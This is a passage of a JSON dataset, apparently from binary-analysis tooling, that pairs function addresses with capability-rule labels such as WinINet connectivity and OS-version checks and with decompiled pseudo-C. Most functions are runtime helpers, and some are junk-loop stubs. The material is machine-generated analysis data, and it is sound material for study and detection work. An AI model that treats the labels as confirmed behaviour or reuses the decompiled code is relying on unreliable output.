            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00404f70(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t *arg_8h_00;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00403120(4);\n    fcn.0040620d(0);\n    arg_8h_00 = *0x57423c;\n    *(unaff_EBP + -4) = 0;\n    if (arg_8h_00 == NULL) {\n        arg_8h_00 = fcn.00405b5a(0);\n        fcn.004017a3(arg_8h_00);\n        arg_8h_00[4] = 0x3f;\n        fcn.00404c00(0x553c14);\n        pcVar1 = *(*arg_8h_00 + 4);\n        *0x574214 = arg_8h_00;\n        (**0x578000)();\n        (*pcVar1)();\n        *0x574230 = *0x574214;\n    }\n    if (*(unaff_EBP + 8) != '\\0') {\n        pcVar1 = *(*arg_8h_00 + 4);\n        (**0x578000)();\n        (*pcVar1)();\n    }\n    fcn.004036f2();\n    fcn.00401127();\n    return;\n}\n",
        "token_count": 332
    },
    "0040501a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid __cdecl fcn.0040501a(int16_t *arg_8h, uint32_t *arg_ch, int32_t arg_10h)\n\n{\n    int16_t **arg_10h_00;\n    int16_t *piVar1;\n    char cVar2;\n    int32_t iVar3;\n    int16_t **arg_10h_01;\n    int32_t iVar4;\n    uint32_t arg_8h_00;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint Locale;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    iVar3 = fcn.004043ef();\n    arg_10h_01 = iVar3 + 0x50;\n    var_10h = 0;\n    Locale = 0;\n    var_8h = 0;\n    iVar4 = fcn.004043ef();\n    *(iVar4 + 0x34c) = &var_10h;\n    piVar1 = arg_8h + 0x40;\n    *arg_10h_01 = arg_8h;\n    arg_10h_00 = iVar3 + 0x54;\n    *arg_10h_00 = piVar1;\n    if ((piVar1 != NULL) && (*piVar1 != 0)) {\n        fcn.004cf127(0x559d88, *0x559ed4 + -1, arg_10h_00);\n    }\n    var_10h = 0;\n    if ((*arg_10h_01 == NULL) || (**arg_10h_01 == 0)) {\n        if ((*arg_10h_00 == NULL) || (**arg_10h_00 == 0)) {\n            var_10h = 0x104;\n            Locale = (*_sym.imp.KERNEL32.dll_GetUserDefaultLCID)();\n            var_8h = Locale;\n        }\n        else {\n            fcn.004ce911(&var_10h);\n        }\ncode_r0x004cf2ba:\n        if (var_10h == 0) goto code_r0x004cf2c2;\n    }\n    else {\n        if ((*arg_10h_00 == NULL) || (**arg_10h_00 == 0)) {\n            fcn.004cea54(&var_10h);\n        }\n        else {\n            fcn.004ce993(&var_10h);\n        }\n        if (var_10h == 0) {\n            cVar2 = fcn.004cf127(0x5599d8, *0x559d80 + -1, arg_10h_01);\n            if (cVar2 != '\\0') {\n                if ((*arg_10h_00 == NULL) || (**arg_10h_00 == 0)) {\n                    fcn.004cea54(&var_10h);\n                }\n                else {\n                    fcn.004ce993(&var_10h);\n                }\n            }\n            goto code_r0x004cf2ba;\n        }\n    }\n    arg_8h_00 = fcn.004cef57(-(arg_8h != NULL) & arg_8h + 0x80, &var_10h);\n    if (((arg_8h_00 != 0) && (iVar4 = (*_sym.imp.KERNEL32.dll_IsValidCodePage)(arg_8h_00 & 0xffff),  iVar4 != 0)) &&\n       (iVar4 = (*_sym.imp.KERNEL32.dll_IsValidLocale)(Locale, 1),  iVar4 != 0)) {\n        if (arg_ch != NULL) {\n            *arg_ch = arg_8h_00;\n        }\n        fcn.00404fca(Locale, iVar3 + 0x2a0, 0x55, 0);\n        if (arg_10h != 0) {\n            fcn.00404fca(Locale, arg_10h + 0x120, 0x55, 0);\n            iVar3 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoW)(Locale, 0x1001, arg_10h, 0x40);\n            if ((iVar3 != 0) &&\n               (iVar3 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoW)(var_8h, 0x1002, arg_10h + 0x80, 0x40),  iVar3 != 0)) {\n                fcn.00404534(arg_8h_00, arg_10h + 0x100, 0x10, 10);\n            }\n        }\n    }\ncode_r0x004cf2c2:\n    fcn.004030bc(arg_ch);\n    return;\n}\n",
        "token_count": 1081
    },
    "00405047": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00405047(int32_t param_1)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    \n    if ((*(param_1 + 0x45c) == 2) && (*(param_1 + 0x458) == 1)) {\n        if (99 < *(param_1 + 0xaa8)) {\n            puVar1 = fcn.00403a35();\n            *puVar1 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n        uVar2 = fcn.0040117c(param_1 + 0x464 + *(param_1 + 0xaa8) * 0x10, 4, *(param_1 + 0x31), *(param_1 + 0x2c));\n        return uVar2;\n    }\n    return 1;\n}\n",
        "token_count": 196
    },
    "0040506a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040506a(int32_t *arg_8h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        iVar3 = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            puVar1 = fcn.00403a35();\n            *puVar1 = 0x16;\n            uVar2 = fcn.004037ce();\n            return uVar2 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar2 = fcn.0040117c(in_ECX + 0x464 + uVar2 * 0x10, 1, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar2;\n        }\n        iVar3 = **(in_ECX + 0x46c + uVar2 * 0x10);\n    }\n    *arg_8h = iVar3;\n    arg_8h[1] = iVar3 >> 0x1f;\n    return CONCAT31(iVar3 >> 8, 1);\n}\n",
        "token_count": 345
    },
    "004050e2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004050e2(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *puVar1;\n    uint32_t *puVar2;\n    \n    if (*(arg_ch + 4) != '\\0') {\n        puVar1 = fcn.004048a9();\n        *puVar1 = 0;\n        puVar1[1] = arg_8h << 0x1f | 0x7ff00000;\n        return;\n    }\n    puVar2 = fcn.0040184d();\n    *puVar2 = arg_8h << 0x1f | 0x7f800000;\n    return;\n}\n",
        "token_count": 153
    },
    "004050f6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint16_t * fcn.004050f6(uint16_t *param_1, uint16_t param_2)\n\n{\n    int32_t iVar1;\n    uchar auVar2 [16];\n    uchar auVar3 [16];\n    uint16_t uVar4;\n    uint16_t uVar5;\n    int32_t iStack52;\n    \n    if (0 < *0x573c4c) {\n        auVar2 = pshuflw(ZEXT216(param_2), ZEXT216(param_2), 0);\n        do {\n            if ((param_1 & 0xfff) < 0xff1) {\n                uVar4 = SUB162(auVar2, 0);\n                uVar5 = SUB162(auVar2 >> 0x10, 0);\n                auVar3 = CONCAT214(-(param_1[7] == 0), \n                                   CONCAT212(-(param_1[6] == 0), \n                                             CONCAT210(-(param_1[5] == 0), \n                                                       CONCAT28(-(param_1[4] == 0), \n                                                                CONCAT26(-(param_1[3] == 0), \n                                                                         CONCAT24(-(param_1[2] == 0), \n                                                                                  CONCAT22(-(param_1[1] == 0), \n                                                                                           -(*param_1 == 0)))))))) |\n                         CONCAT214(-(param_1[7] == uVar5), \n                                   CONCAT212(-(param_1[6] == uVar4), \n                                             CONCAT210(-(param_1[5] == uVar5), \n                                                       CONCAT28(-(param_1[4] == uVar4), \n                                                                CONCAT26(-(param_1[3] == uVar5), \n                                                                         CONCAT24(-(param_1[2] == uVar4), \n                                                                                  CONCAT22(-(param_1[1] == uVar5), \n                                                                                           -(*param_1 == uVar4))))))));\n                uVar4 = SUB161(auVar3 >> 7, 0) & 1 | (SUB161(auVar3 >> 0xf, 0) & 1) << 1 |\n                        (SUB161(auVar3 >> 0x17, 0) & 1) << 2 | (SUB161(auVar3 >> 0x1f, 0) & 1) << 3 |\n                        (SUB161(auVar3 >> 0x27, 0) & 1) << 4 | (SUB161(auVar3 >> 0x2f, 0) & 1) << 5 |\n                        (SUB161(auVar3 >> 0x37, 0) & 1) << 6 | (SUB161(auVar3 >> 0x3f, 0) & 1) << 7 |\n                        (SUB161(auVar3 >> 0x47, 0) & 1) << 8 | (SUB161(auVar3 >> 0x4f, 0) & 1) << 9 |\n                        (SUB161(auVar3 >> 0x57, 0) & 1) << 10 | (SUB161(auVar3 >> 0x5f, 0) & 1) << 0xb |\n                        (SUB161(auVar3 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar3 >> 0x6f, 0) & 1) << 0xd |\n                        (SUB161(auVar3 >> 0x77, 0) & 1) << 0xe | SUB161(auVar3 >> 0x7f, 0) << 0xf;\n                if (uVar4 != 0) goto code_r0x004e3202;\n                iStack52 = 0x10;\n            }\n            else {\n                if (*param_1 == param_2) {\n                    return param_1;\n                }\n                if (*param_1 == 0) {\n                    return NULL;\n                }\n                iStack52 = 2;\n            }\n            param_1 = param_1 + iStack52;\n        } while( true );\n    }\n    uVar4 = *param_1;\n    while ((uVar4 != 0 && (uVar4 != param_2))) {\n        param_1 = param_1 + 1;\n        uVar4 = *param_1;\n    }\ncode_r0x004e31a4:\n    return (uVar4 != param_2) - 1 & param_1;\ncode_r0x004e3202:\n    iVar1 = 0;\n    if (uVar4 != 0) {\n        for (; (uVar4 >> iVar1 & 1) == 0; iVar1 = iVar1 + 1) {\n        }\n    }\n    param_1 = param_1 + iVar1;\n    uVar4 = *param_1;\n    goto code_r0x004e31a4;\n}\n",
        "token_count": 1095
    },
    "0040510a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040510a(uint noname_0, uint arg_ch)\n\n{\n    ushort uVar1;\n    uint uVar2;\n    uint *puVar3;\n    int32_t extraout_ECX;\n    int32_t iVar4;\n    int32_t unaff_EBP;\n    uint *puVar5;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_3ch;\n    uint var_4h;\n    \n    fcn.00405434(100);\n    uVar2 = fcn.00401357();\n    *(unaff_EBP + -0x6c) = uVar2;\n    puVar3 = fcn.0040273e(unaff_EBP + -0x68);\n    *(unaff_EBP + -0x70) = extraout_ECX;\n    puVar5 = unaff_EBP + -0x3c;\n    for (iVar4 = 0xb; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar5 = puVar5 + 1;\n    }\n    *(extraout_ECX + 8) = 0;\n    *(extraout_ECX + 0x10) = 0;\n    *(extraout_ECX + 0x14) = 0;\n    *(unaff_EBP + -4) = 0;\n    fcn.0040273e(unaff_EBP + -0x68);\n    uVar2 = 0x552647;\n    iVar4 = *(unaff_EBP + -0x6c);\n    if (*(unaff_EBP + 0xc) == '\\0') {\n        uVar2 = *(iVar4 + 8);\n    }\n    uVar2 = fcn.00401cc1(uVar2, 0, unaff_EBP + -0x68);\n    *(extraout_ECX + 8) = uVar2;\n    uVar2 = fcn.00403201(\"false\", 0, unaff_EBP + -0x3c);\n    *(extraout_ECX + 0x10) = uVar2;\n    uVar2 = fcn.00403201(\"true\", 0, unaff_EBP + -0x3c);\n    *(extraout_ECX + 0x14) = uVar2;\n    if (*(unaff_EBP + 0xc) == '\\0') {\n        *(extraout_ECX + 0xc) = **(iVar4 + 0x30);\n        uVar1 = **(iVar4 + 0x34);\n    }\n    else {\n        uVar1 = fcn.00405551(0x2e, 0, unaff_EBP + -0x3c);\n        *(extraout_ECX + 0xc) = uVar1;\n        uVar1 = fcn.00405551(0x2c, 0, unaff_EBP + -0x3c);\n    }\n    *(extraout_ECX + 0xe) = uVar1;\n    fcn.004068fc();\n    return;\n}\n",
        "token_count": 721
    },
    "00405132": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nchar ** __cdecl fcn.00405132(char **arg_8h, int32_t *arg_ch, int32_t arg_10h)\n\n{\n    char cVar1;\n    uint var_18h;\n    char *var_10h;\n    char *var_ch;\n    char *var_8h;\n    char *var_4h;\n    \n    cVar1 = **0x574458;\n    if (cVar1 == '\\0') {\n        fcn.0040129e(arg_8h, 1, arg_ch);\n        return arg_8h;\n    }\n    if (arg_10h != 0) {\n        if (cVar1 == 'X') {\n            *0x574458 = *0x574458 + 1;\n            if (*arg_ch == 0) {\n                var_10h = \"void\";\n                var_ch = 0x4;\n                goto code_r0x00490f12;\n            }\n            var_10h = \"void \";\n            var_ch = 0x5;\n            goto code_r0x00490f31;\n        }\n        if (((cVar1 == '_') && ((*0x574458)[1] == '_')) && ((*0x574458)[2] == 'Z')) {\n            *0x574458 = *0x574458 + 3;\n        }\n    }\n    if (**0x574458 == '$') {\n        if (((*0x574458)[1] == '$') && ((*0x574458)[2] == 'T')) {\n            *0x574458 = *0x574458 + 3;\n            if (*arg_ch == 0) {\n                var_10h = \"std::nullptr_t\";\n                var_ch = 0xe;\ncode_r0x00490f12:\n                fcn.00402d47(&var_10h);\n                return arg_8h;\n            }\n            var_10h = \"std::nullptr_t \";\n            var_ch = 0xf;\ncode_r0x00490f31:\n            fcn.004040cf(arg_8h, &var_10h, arg_ch);\n            return arg_8h;\n        }\n    }\n    else if (**0x574458 == 'Y') {\n        *0x574458 = *0x574458 + 1;\n        fcn.0040188e(arg_8h, arg_ch);\n        return arg_8h;\n    }\n    fcn.00405c13(&var_8h, arg_ch);\n    if ((arg_ch[1] & 0x4000U) == 0) {\n        var_10h = var_8h;\n        var_ch = var_4h;\n        if ((arg_ch[1] & 0x2000U) == 0) goto code_r0x00491023;\n        var_10h = \"cli::pin_ptr<\";\n        var_ch = 0xd;\n    }\n    else {\n        var_10h = \"cli::array<\";\n        var_ch = 0xb;\n    }\n    fcn.00402d47(&var_10h);\n    fcn.004053b7(&var_10h, &var_8h);\ncode_r0x00491023:\n    *arg_8h = var_10h;\n    arg_8h[1] = var_ch;\n    return arg_8h;\n}\n",
        "token_count": 735
    },
    "0040513c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0040513c(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_4h;\n    \n    if (arg_10h == 0) {\n        iVar1 = 0;\n    }\n    else if ((arg_8h == 0) || (arg_ch == 0)) {\n        puVar2 = fcn.00403a35();\n        *puVar2 = 0x16;\n        fcn.004037ce();\n        iVar1 = 0x7fffffff;\n    }\n    else {\n        iVar1 = 0x7fffffff;\n        if (arg_10h < 0x80000000) {\n            fcn.004058a8(arg_14h);\n            if (*(var_ch + 0xa4) == 0) {\n                iVar1 = fcn.0040230b(arg_8h, arg_ch, arg_10h);\n            }\n            else {\n                iVar3 = fcn.00405b78(*(var_ch + 0xa4), 0x1001, arg_8h, arg_10h, arg_ch, arg_10h);\n                if (iVar3 == 0) {\n                    puVar2 = fcn.00403a35();\n                    *puVar2 = 0x16;\n                }\n                else {\n                    iVar1 = iVar3 + -2;\n                }\n            }\n            if (var_4h != '\\0') {\n                *(var_10h + 0x350) = *(var_10h + 0x350) & 0xfffffffd;\n            }\n        }\n        else {\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            fcn.004037ce();\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 458
    },
    "00405146": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405146(int32_t param_1)\n\n{\n    uint *puVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((*(param_1 + 4) != 0) && (puVar1 = (**(**(param_1 + 4) + 8))(),  puVar1 != NULL)) {\n        (***puVar1)(1);\n    }\n    return;\n}\n",
        "token_count": 104
    },
    "00405150": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.00405150(int32_t arg_8h)\n\n{\n    char cVar1;\n    \n    if (arg_8h == 0) {\n        *0x573c20 = 1;\n    }\n    fcn.0040384b();\n    cVar1 = fcn.00404bb0();\n    if (cVar1 != '\\0') {\n        cVar1 = fcn.00404c0f();\n        if (cVar1 != '\\0') {\n            return 1;\n        }\n        fcn.004011b3(0);\n    }\n    return 0;\n}\n",
        "token_count": 135
    },
    "00405209": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00405209(uint32_t *arg_8h)\n\n{\n    uint16_t uVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        uVar1 = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar3 = *(in_ECX + 0xaa8);\n        if (99 < uVar3) {\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            uVar3 = fcn.004037ce();\n            return uVar3 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.0040117c(in_ECX + 0x464 + uVar3 * 0x10, 1, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        uVar1 = **(in_ECX + 0x46c + uVar3 * 0x10);\n    }\n    *arg_8h = uVar1;\n    arg_8h[1] = 0;\n    return CONCAT31(uVar1 >> 8, 1);\n}\n",
        "token_count": 342
    },
    "0040522c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040522c(code **param_1)\n\n{\n    *param_1 = vtable.std::ctype_wchar_t_.0;\n    if (param_1[4] != NULL) {\n        fcn.00404179(param_1[3]);\n    }\n    fcn.00404179(param_1[5]);\n    *param_1 = vtable.std::_Facet_base.0;\n    return;\n}\n",
        "token_count": 96
    },
    "0040526d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0040526d(uint *arg_8h)\n\n{\n    uint arg_8h_00;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    if (**0x574458 == '\\0') {\n        fcn.004017df(1);\n        return arg_8h;\n    }\n    var_8h = 0;\n    var_4h = 0;\n    fcn.00404557(0x26);\n    arg_8h_00 = fcn.00403e8b(&var_10h);\n    fcn.00402eeb(arg_8h_00);\n    if (**0x574458 == '@') {\n        *0x574458 = *0x574458 + 1;\n        *arg_8h = var_8h;\n        arg_8h[1] = var_4h;\n    }\n    else {\n        arg_8h[1] = 0;\n        *(arg_8h + 1) = 2;\n        *arg_8h = 0;\n    }\n    return arg_8h;\n}\n",
        "token_count": 253
    },
    "004052ef": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004052ef(uint arg_8h)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    int32_t var_6ch;\n    int32_t var_68h;\n    int32_t var_64h;\n    int32_t var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_14h = 0x450520;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_10h = 3;\n    fcn.00401e79(0x54a2c4);\n    var_10h = 4;\n    fcn.00401e79(\"ibxbimjniiutnchzoxemcjvdamfodg\");\n    for (var_60h = 9; 0 < var_60h; var_60h = var_60h + -1) {\n    }\n    for (var_64h = 0x58; 0 < var_64h; var_64h = var_64h + -1) {\n    }\n    for (var_68h = 0x3a; 0 < var_68h; var_68h = var_68h + -1) {\n    }\n    for (var_6ch = 0x5f; 0 < var_6ch; var_6ch = var_6ch + -1) {\n    }\n    var_10h = 5;\n    fcn.00401e79(0x54a2eb);\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return arg_8h;\n}\n",
        "token_count": 528
    },
    "004052f4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004052f4(int32_t *param_1)\n\n{\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*param_1 == 0) {\n        fcn.0040620d(0);\n        if (*param_1 == 0) {\n            *0x574210 = *0x574210 + 1;\n            *param_1 = *0x574210;\n        }\n        fcn.004036f2();\n    }\n    return *param_1;\n}\n",
        "token_count": 124
    },
    "0040530d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040530d(void)\n\n{\n    bool bVar1;\n    uint32_t in_MXCSR;\n    uint16_t in_FPUControlWord;\n    float10 in_ST0;\n    \n    if (*0x575754 != 0) {\n        bVar1 = (in_MXCSR & 0x7f80) == 0x1f80;\n        if (bVar1) {\n            bVar1 = (in_FPUControlWord & 0x7f) == 0x7f;\n        }\n        if (bVar1) {\n            fcn.004e1e8e(SUB84(in_ST0, 0), in_ST0 >> 0x20);\n            return;\n        }\n    }\n    fcn.00403422(SUB84(in_ST0, 0), in_ST0 >> 0x20);\n    fcn.004e1168();\n    return;\n}\n",
        "token_count": 201
    },
    "0040532b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040532b(uint32_t *arg_8h)\n\n{\n    uint16_t uVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        uVar1 = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar3 = *(in_ECX + 0xaa8);\n        if (99 < uVar3) {\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            uVar3 = fcn.004037ce();\n            return uVar3 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.004028c4(in_ECX + 0x464 + uVar3 * 0x10, 1, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        uVar1 = **(in_ECX + 0x46c + uVar3 * 0x10);\n    }\n    *arg_8h = uVar1;\n    arg_8h[1] = 0;\n    return CONCAT31(uVar1 >> 8, 1);\n}\n",
        "token_count": 343
    },
    "00405330": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00405330(uint32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    ushort *puVar2;\n    code *pcVar3;\n    int32_t *in_ECX;\n    \n    if ((*in_ECX[8] == 0) || (piVar1 = in_ECX[0xc],  *piVar1 < 1)) {\n        pcVar3 = *(*in_ECX + 0xc);\n        (**0x578000)(arg_8h);\n        arg_8h = (*pcVar3)();\n    }\n    else {\n        *piVar1 = *piVar1 + -1;\n        puVar2 = *in_ECX[8];\n        *in_ECX[8] = puVar2 + 1;\n        *puVar2 = arg_8h;\n    }\n    return arg_8h & 0xffff;\n}\n",
        "token_count": 199
    },
    "00405371": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405371(uint arg_8h)\n\n{\n    int32_t iStack32;\n    int32_t iStack28;\n    \n    for (iStack28 = 0x58; 0 < iStack28; iStack28 = iStack28 + -1) {\n    }\n    for (iStack32 = 0x13; 0 < iStack32; iStack32 = iStack32 + -1) {\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    return;\n}\n",
        "token_count": 131
    },
    "0040539e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
